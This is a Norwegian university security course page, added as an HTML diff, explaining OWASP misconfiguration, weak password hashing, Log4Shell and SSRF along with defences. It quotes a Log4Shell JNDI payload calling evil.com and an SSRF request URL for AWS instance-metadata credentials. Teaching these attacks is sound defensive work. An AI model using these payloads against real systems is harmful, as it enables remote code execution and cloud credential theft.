@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Konfigurasjon, krypto, komponenter og SSRF — Kapittel 2</title>
+<link rel="stylesheet" href="../style.css">
+<link rel="icon" type="image/png" href="../favicon.png">
+</head>
+<body>
+<nav class="site-nav">
+  <div class="container">
+    <a href="../" class="brand">TDT4237</a>
+    <a href="index.html" class="nav-back">&larr; Kapittel 2</a>
+    <div class="nav-search-wrapper">
+      <svg class="nav-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <input type="text" id="nav-search" placeholder="Laster…" autocomplete="off" disabled>
+      <div id="nav-search-results"></div>
+    </div>
+  </div>
+</nav>
+
+<main data-chapter="Kapittel 2: OWASP Top 10">
+<header class="hero">
+  <div class="container">
+    <div class="eyebrow">Kapittel 2 · A02 · A05 · A06 · A10</div>
+    <h1>Konfigurasjon, krypto og <em>SSRF</em></h1>
+    <p class="lede">Default credentials, MD5-passord, Log4Shell og servere som henter URL-er de ikke burde — fire kategorier med en felles fellesnevner: svikt i grunnleggende hygiene.</p>
+    <nav class="toc">
+      <a href="#misconfiguration"><span class="toc-num">01</span>Security misconfiguration</a>
+      <a href="#kryptofeil"><span class="toc-num">02</span>Kryptografiske feil</a>
+      <a href="#sårbare-komponenter"><span class="toc-num">03</span>Sårbare komponenter</a>
+      <a href="#ssrf"><span class="toc-num">04</span>SSRF</a>
+      <a href="#forsvar-konfig"><span class="toc-num">05</span>Forsvar</a>
+    </nav>
+  </div>
+</header>
+
+<section id="misconfiguration">
+  <div class="container">
+    <div class="section-badge">01 · A05</div>
+    <h2>Security <em>misconfiguration</em></h2>
+    <p class="section-intro">Den vanligste kilden til konfigurasjonssårbarheter er ikke angripere — det er standardinnstillinger som aldri ble endret.</p>
+    <p class="lead">En utvikler setter opp en ny MongoDB-instans. Standard: autentisering skrudd av. Instansen eksponeres mot internett for å gjøre testing enklere. To dager senere er databasen slettet av en automatisert scanner og en løsepengenotat er lagt igjen. Scenariet er ikke konstruert — det skjedde med titusener av MongoDB-instanser i 2017.</p>
+
+    <p>Klassiske konfigurasjonsfeil:</p>
+    <ul>
+      <li><strong>Default credentials:</strong> <code>admin/admin</code>, <code>root/root</code> på databaser, routere, kameraer, administrasjonsgrensesnitt.</li>
+      <li><strong>Verbose feilmeldinger:</strong> stack traces, SQL-spørringer, filstiinformasjon eksponert til brukeren.</li>
+      <li><strong>Feilkonfigurerte skylagre:</strong> offentlige S3-bøtter med sensitiv data, world-readable GCS-bøtter.</li>
+      <li><strong>Unødvendige funksjoner aktivert:</strong> XML external entities (XXE), directory listing, debug-modus i produksjon.</li>
+      <li><strong>Manglende sikkerheadsheadere:</strong> <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Strict-Transport-Security</code>.</li>
+    </ul>
+
+    <div class="callout callout-blue">
+      <h4>Merk</h4>
+      <p>Herding («hardening») er prosessen med å fjerne alt som ikke trengs og sette alt som trengs til det sikreste alternativet. Bruk Infrastructure as Code og sjekk konfigurasjonen automatisk i pipeline.</p>
+    </div>
+  </div>
+</section>
+
+<section id="kryptofeil">
+  <div class="container">
+    <div class="section-badge">02 · A02</div>
+    <h2>Krypto<em>grafiske feil</em></h2>
+    <p class="section-intro">Kryptografifeil skyldes sjelden svakheter i algoritmene — de skyldes feil bruk av riktige algoritmer.</p>
+    <p class="lead">En applikasjon lagrer passord som <code>MD5(passord)</code>. MD5 er ikke kryptert — det er en kryptografisk hashfunksjon, men en rask en. En angriper med GPU kan beregne milliarder av MD5-hashes per sekund. Med et rainbow table er det enda raskere. Passordet «Passord123» er knekket på under et millisekund. Det er ikke et nøkkelspørsmål om MD5 er «kryptert» — det er et spørsmål om hastighet.</p>
+
+    <pre><code><span class="comment"># Feil: MD5 er for rask — angriper beregner milliarder/sek</span>
+import hashlib
+stored = hashlib.md5(password.encode()).hexdigest()
+
+<span class="comment"># Riktig: bcrypt bruker tid og ressurser med vilje</span>
+import bcrypt
+stored = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+
+<span class="comment"># Verifiser</span>
+bcrypt.checkpw(input_password.encode(), stored)</code></pre>
+
+    <p>Andre vanlige kryptografifeil:</p>
+    <ul>
+      <li><strong>ECB-modus:</strong> identiske klartekstblokker gir identiske chiffreblokker — mønstre bevares. Bruk GCM eller CBC med tilfeldig IV.</li>
+      <li><strong>Hard-kodede nøkler:</strong> krypteringsnøkler i kildekoden er ikke hemmelige. Bruk miljøvariabler + secrets manager.</li>
+      <li><strong>Svake tilfeldige tall:</strong> <code>random.random()</code> er ikke kryptografisk sikker. Bruk <code>secrets</code>-modulen eller <code>os.urandom()</code>.</li>
+      <li><strong>HTTP i stedet for HTTPS:</strong> data i klartekst over nettverket.</li>
+    </ul>
+  </div>
+</section>
+
+<section id="sårbare-komponenter">
+  <div class="container">
+    <div class="section-badge">03 · A06</div>
+    <h2>Sårbare og utdaterte <em>komponenter</em></h2>
+    <p class="section-intro">Du skriver kanskje 5 % av koden som kjører i applikasjonen din. Resten er avhengigheter — og de har sine egne sårbarheter.</p>
+    <p class="lead">Desember 2021. En kritisk sårbarhet avsløres i Log4j2, et Java-logging-bibliotek brukt i titusener av systemer verden over. En angriper kan kjøre vilkårlig kode ved å logge en streng som <code>${jndi:ldap://evil.com/x}</code>. Bare det å logge en brukerleverte melding — noe alle systemer gjør — er nok. Log4Shell er ikke et eksotisk angrep mot en obskur komponent. Det er et angrep mot infrastruktur.</p>
+
+    <p>Håndtering av sårbare komponenter:</p>
+    <ul>
+      <li><strong>SCA (Software Composition Analysis):</strong> automatisk skanning av avhengigheter mot kjente sårbarhetsdatabaser (NVD, OSV, GitHub Advisory). Verktøy: Dependabot, Snyk, OWASP Dependency-Check.</li>
+      <li><strong>SBOM (Software Bill of Materials):</strong> komplett liste over alle komponenter og versjoner — nødvendig for å vite hva du har.</li>
+      <li><strong>Oppdateringsrutiner:</strong> automatiske sikkerhetsoppdateringer for avhengigheter, men med tester som verifiserer at oppdateringen ikke brekker noe.</li>
+      <li><strong>Minimale avhengigheter:</strong> færre pakker betyr færre sårbarheter. Fjern det som ikke brukes.</li>
+    </ul>
+  </div>
+</section>
+
+<section id="ssrf">
+  <div class="container">
+    <div class="section-badge">04 · A10</div>
+    <h2>Server-Side Request <em>Forgery</em></h2>
+    <p class="section-intro">SSRF er et angrep der serveren gjøres til en proxy angriperen kontrollerer — og serveren er innenfor brannmuren.</p>
+    <p class="lead">En funksjon lar brukere importere bilder fra URL. Brukeren sender <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. Serveren henter URL-en — den er tross alt innenfor AWS sin infrastruktur — og returnerer midlertidige IAM-credentials til angriperen. Med disse credentials kan angriperen aksessere S3-bøtter, sette opp EC2-instanser og eskalere til full kontokompromittering.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 220" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="12">
+        <defs>
+          <marker id="ssrfarr" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
+            <path d="M1,1 L7,4 L1,7 Z" fill="#b04428"/>
+          </marker>
+        </defs>
+        <!-- Angriper utenfor -->
+        <rect x="20" y="85" width="110" height="50" rx="3" fill="rgba(176,68,40,0.1)" stroke="#b04428" stroke-width="1.5"/>
+        <text x="75" y="106" text-anchor="middle" font-weight="600" fill="#b04428">Angriper</text>
+        <text x="75" y="122" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">sender URL</text>
+
+        <!-- Brannmur -->
+        <line x1="170" y1="30" x2="170" y2="195" stroke="#c9c0ae" stroke-width="2" stroke-dasharray="6,4"/>
+        <text x="172" y="22" font-size="11" fill="#a39886">brannmur</text>
+
+        <!-- Webserver -->
+        <rect x="200" y="85" width="130" height="50" rx="3" fill="rgba(45,74,122,0.1)" stroke="#2d4a7a" stroke-width="1.5"/>
+        <text x="265" y="106" text-anchor="middle" font-weight="600" fill="#2d4a7a">Webserver</text>
+        <text x="265" y="122" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">henter URL</text>
+
+        <!-- Intern ressurs -->
+        <rect x="460" y="55" width="160" height="50" rx="3" fill="rgba(198,138,31,0.1)" stroke="#c68a1f" stroke-width="1.5"/>
+        <text x="540" y="76" text-anchor="middle" font-weight="600" fill="#c68a1f">169.254.169.254</text>
+        <text x="540" y="92" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">AWS metadata</text>
+
+        <!-- Intern tjeneste -->
+        <rect x="460" y="130" width="160" height="50" rx="3" fill="rgba(61,107,58,0.1)" stroke="#3d6b3a" stroke-width="1.5"/>
+        <text x="540" y="151" text-anchor="middle" font-weight="600" fill="#3d6b3a">intern DB</text>
+        <text x="540" y="167" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">10.0.0.5:5432</text>
+
+        <!-- Piler -->
+        <line x1="132" y1="110" x2="198" y2="110" stroke="#b04428" stroke-width="1.5" marker-end="url(#ssrfarr)"/>
+        <line x1="332" y1="95" x2="458" y2="82" stroke="#b04428" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#ssrfarr)"/>
+        <line x1="332" y1="120" x2="458" y2="148" stroke="#b04428" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#ssrfarr)"/>
+        <text x="390" y="88" font-size="10" fill="#b04428" font-style="italic">kan nå interne</text>
+        <text x="390" y="100" font-size="10" fill="#b04428" font-style="italic">ressurser</text>
+      </svg>
+      <figcaption>SSRF: angriperen bruker webserveren som proxy for å nå interne ressurser som er utilgjengelige utenfra.</figcaption>
+    </figure>
+  </div>
+</section>
+
+<section id="forsvar-konfig">
+  <div class="container">
+    <div class="section-badge">05 · Forsvar</div>
+    <h2>Forsvar mot konfig-, krypto- og <em>SSRF-feil</em></h2>
+    <p class="section-intro">Alle fire kategoriene har veldokumenterte fixes — de krever ikke avansert kunnskap, de krever konsistens.</p>
+    <p class="lead">Den felles tråden i misconfiguration, cryptographic failures, vulnerable components og SSRF er at de alle oppstår i fravær av aktiv innsats — ikke i nærvær av avanserte angrep. Et system som aldri er herdet, en hashfunksjon som aldri er oppdatert, en avhengighet som aldri er patched, en URL-validering som aldri ble skrevet. Forsvar er rutine, ikke heroisme.</p>
+
+    <h3>Konfigurasjon</h3>
+    <ul>
+      <li>Endre alle standardpassord og disable default-kontoer.</li>
+      <li>Skru av debug-modus og verbose feilmeldinger i produksjon.</li>
+      <li>Sett sikkerhedsheadere: <code>Strict-Transport-Security</code>, <code>X-Frame-Options: DENY</code>, <code>X-Content-Type-Options: nosniff</code>.</li>
+      <li>Bruk IaC (Terraform, Ansible) og lint konfigurasjoner automatisk.</li>
+    </ul>
+
+    <h3>Kryptografi</h3>
+    <ul>
+      <li>Passord: Argon2id eller bcrypt — aldri MD5, SHA-1 eller usaltede hashes.</li>
+      <li>Symmetrisk kryptering: AES-256-GCM med tilfeldig nonce per melding.</li>
+      <li>Tilfeldige tall: <code>secrets</code>-modulen (Python), <code>crypto.randomBytes</code> (Node).</li>
+      <li>Transport: TLS 1.2+ — aldri HTTP for autentisert innhold.</li>
+    </ul>
+
+    <h3>Sårbare komponenter</h3>
+    <ul>
+      <li>Kjør SCA-skanning i CI — blokker builds med kritiske sårbarheter.</li>
+      <li>Hold en oppdatert SBOM.</li>
+      <li>Abonner på security advisories for kritiske avhengigheter.</li>
+    </ul>
+
+    <h3>SSRF</h3>
+    <ul>
+      <li>Valider og allowlist URL-er serveren skal hente — nekt RFC 1918-adresser og metadata-adresser.</li>
+      <li>Bruk IMDSv2 på AWS (krever session-token, blokkerer enkle SSRF).</li>
+      <li>Nettverkssegmentering: webservere skal ikke ha direkte tilgang til interne tjenester utover det som trengs.</li>
+    </ul>
+
+    <div class="callout callout-green">
+      <h4>En pipeline som hjelper</h4>
+      <p>En moderne CI/CD-pipeline bør inneholde: dependency-scanning (SCA), container image scanning, konfigurasjonssjekk (tfsec, checkov) og DAST-skanning mot staging. Automatisering gjør det mulig å holde tritt med et trusselbilde i endring.</p>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="ornament">&#10043; &#10043; &#10043;</div>
+    <p>NTNU · TDT4237 · Vår 2026</p>
+  </div>
+</footer>
+
+<script src="../chat-widget.js"></script>
+<script src="../nav-search.js"></script>
+</body>
+</html>
